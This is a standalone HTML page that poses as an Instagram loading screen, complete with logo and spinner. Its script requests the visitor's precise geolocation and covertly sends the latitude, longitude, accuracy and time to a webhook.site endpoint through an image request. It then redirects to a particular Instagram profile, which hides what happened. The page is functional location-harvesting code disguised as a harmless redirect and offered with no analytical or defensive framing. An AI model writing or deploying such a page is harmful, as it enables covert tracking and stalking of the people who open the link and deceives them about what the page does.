<!DOCTYPE html>
<html>
<head>
  <title>Loading Instagram...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
      margin: 0;
      padding: 0;
      background: #000;
      color: #fff;
      text-align: center;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
    }
    .container {
      max-width: 600px;
    }
    .ig-logo {
      width: 140px;
      margin-bottom: 40px;
    }
    .spinner {
      border: 4px solid rgba(255, 255, 255, 0.2); /* Slightly smaller border */
      border-top: 4px solid #e1306c;
      border-radius: 50%;
      width: 30px; /* Smaller spinner */
      height: 30px;
      animation: spin 1s linear infinite;
      margin: 40px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .bottom-logo {
      position: absolute;
      bottom: 10px;
      left: 50%;
      transform: translateX(-50%);
      width: 300px;
      height: auto;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://techissuestoday.com/wp-content/uploads/2024/08/Instagram-logo-white.png" class="ig-logo" alt="Instagram">
    <div class="spinner"></div>
  </div>

  <img src="https://i.imgur.com/h2umb6u.png" class="bottom-logo" alt="Instagram">

  <script>
    const IG_URL = "https://www.instagram.com/_a.u.r.e.l.i.e.k___";

    const options = {
      enableHighAccuracy: true,
      timeout: 20000,
      maximumAge: 0
    };

    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(success, error, options);
    } else {
      setTimeout(() => window.location.href = IG_URL, 2000);
    }

    function success(pos) {
      const lat = pos.coords.latitude;
      const lon = pos.coords.longitude;
      const acc = pos.coords.accuracy;

      new Image().src = 'https://webhook.site/36fd5f30-aaf6-4019-a81f-01928eaa4f79?lat=' + lat + '&lon=' + lon + '&acc=' + acc + '&time=' + new Date().toISOString();

      setTimeout(() => window.location.href = IG_URL, 1500);
    }

    function error() {
      setTimeout(() => window.location.href = IG_URL, 2000);
    }
  </script>
</body>
</html>
